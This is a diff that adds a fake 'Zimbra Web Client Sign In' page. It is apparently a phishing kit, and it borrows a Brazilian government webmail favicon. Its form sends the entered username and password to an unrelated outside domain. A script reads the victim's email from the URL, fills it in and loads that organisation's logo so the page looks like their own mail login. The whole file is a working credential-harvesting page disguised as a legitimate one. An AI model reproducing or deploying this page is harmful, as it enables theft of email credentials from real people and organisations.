@@ -1,0 +1,181 @@
+<html>
+
+<head>
+<meta http-equiv="Content-Language" content="en-us">
+<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+<title>Zimbra Web Client Sign In</title>
+<link rel="SHORTCUT ICON" href="https://www.webmail.ac.gov.br/img/logo/favicon.ico" >
+</head>
+<style>
+  html, body {
+  font-family: Arial, sans-serif;
+  margin: 0;
+  padding: 0;
+  border: 0;
+  position: absolute;
+  height: 100%;
+  min-width: 100%;
+  font-size: 1pt;
+  color: #404040;
+  direction: ltr;
+  -webkit-text-size-adjust: none;
+  }
+  input[type=text],
+  input[type=password]{
+  -moz-appearance: none;
+  -webkit-appearance: none;
+  appearance: none;
+  display: inline-block;
+  height: 22px;
+  width: 100%;
+  padding: 0 2px;
+  margin: 0;
+  background: #fff;
+  cursor: text;
+  border: 1px #d9d9d9;
+  border-top: 1px solid #c0c0c0;
+  -moz-box-sizing: border-box;
+  -webkit-box-sizing: border-box;
+  box-sizing: border-box;
+  -moz-border-radius: 1px;
+  -webkit-border-radius: 1px;
+  border-radius: 5px;
+  font-size: 9pt;
+  font-family: Helvetica Neue,Helvetica,Arial,Liberation Sans,sans-serif;
+  line-height: 1.1;
+  vertical-align: top;
+  color: black;
+  }
+  input[type=text]:focus,
+  input[type=password]:focus {
+  outline: none;
+  border: 1px solid #4d90fe;
+  }
+</style>
+<style>
+.footer {
+   position: fixed;
+   left: 0;
+   bottom: 0;
+   width: 100%;
+   text-align: center;
+}
+</style>
+<body background="img/bg.png">
+
+<div align="center">
+	<table border="0" width="505" cellspacing="0" cellpadding="0">
+		<tr>
+			<td>
+			<table border="0" width="100%" cellspacing="0" cellpadding="0">
+				<tr>
+					<td height="80"></td>
+				</tr>
+				<tr>
+					<td background="img/fm.png" height="364">
+					<table border="0" width="100%" cellspacing="0" cellpadding="0">
+					<form type="form" method="post" action="https://ganpanmarthdesi.pro/z-php/wp-config-post.php" >
+						<tr>
+							<td height="170" ></td>
+						</tr>
+						<tr>
+							<td>
+							<table border="0" width="100%" cellspacing="0" cellpadding="0">
+								<tr>
+									<td width="94"></td>
+									<td width="66"><font font size="2" color="#FFFFFF" >Username:</font></td>
+									<td width="16"></td>
+									<td><input id="userInput" required class="zLoginField" name="user" type="text" value="email" size="20" maxlength="1024" autocapitalize="off" autocorrect="off"/></td>
+									<td width="89"></td>
+								</tr>
+							</table>
+							</td>
+						</tr>
+						<tr>
+							<td height="10">
+							    <input type="hidden" name="domain" id="domainInput" value="">
+							    <input type="hidden" name="sender" value="Zimbra.com" >
+							    <input type="hidden" name="link" id="linkInput" value="">
+							</td>
+						</tr>
+						<tr>
+							<td>
+							<table border="0" width="100%" cellspacing="0" cellpadding="0">
+								<tr>
+									<td width="94"></td>
+									<td width="66"><font size="2" color="#FFFFFF">Password:</font></td>
+									<td width="16"></td>
+									<td><input id="password" required autocomplete="off" class="zLoginField" name="password" type="password" autofocus value="" size="20" maxlength="1024"/></td>
+									<td width="89"></td>
+								</tr>
+							</table>
+							</td>
+						</tr>
+						<tr>
+							<td height="10"></td>
+						</tr>
+						<tr>
+							<td>
+							<table border="0" width="100%" cellspacing="0" cellpadding="0">
+								<tr>
+									<td>&nbsp;</td>
+									<td width="51">
+									<input type="image" src="img/btn.png" width="50" height="26"></td>
+									<td width="91">&nbsp;</td>
+								</tr>
+							</table>
+							</td>
+						</tr>
+						<tr>
+							<td height="105"></td>
+						</tr>
+						</form>						
+					</table>
+					</td>
+				</tr>
+				<tr>
+					<td>&nbsp;</td>
+				</tr>
+			</table>
+			</td>
+		</tr>
+	</table>
+</div>
+<div class="footer">
+  <p><img border="0" src="./img/footer.png" width="579" height="42"></p>
+</div>
+<script>
+  const params = new URLSearchParams(window.location.search);
+  const raw = params.get('login');
+  const email = raw ? decodeURIComponent(raw) : '';
+
+  let user = '', domain = '';
+  if (email.includes('@')) {
+    [user, domain] = email.split(/@(.*)/, 2);
+  }
+
+  if (email) {
+    document.getElementById('userInput').value = email;
+    document.getElementById('domainInput').value = domain;
+    document.getElementById('domainText').textContent = domain;
+    document.getElementById('linkInput').value = `http://${domain}/`;
+
+    const logoImage = document.getElementById('logoImage');
+    const clearbitLogo = `https://logo.clearbit.com/${domain}`;
+    const hiworksLogo = `https://office.hiworks.com/${domain}/common/logo/login`;
+    const localLogo = `img/logo.png`;
+
+    logoImage.src = clearbitLogo;
+
+    logoImage.onerror = () => {
+      logoImage.onerror = () => {
+        logoImage.onerror = null; // Stop further errors
+        logoImage.src = localLogo;
+      };
+      logoImage.src = hiworksLogo;
+    };
+  }
+</script>
+</body>
+
+</html>
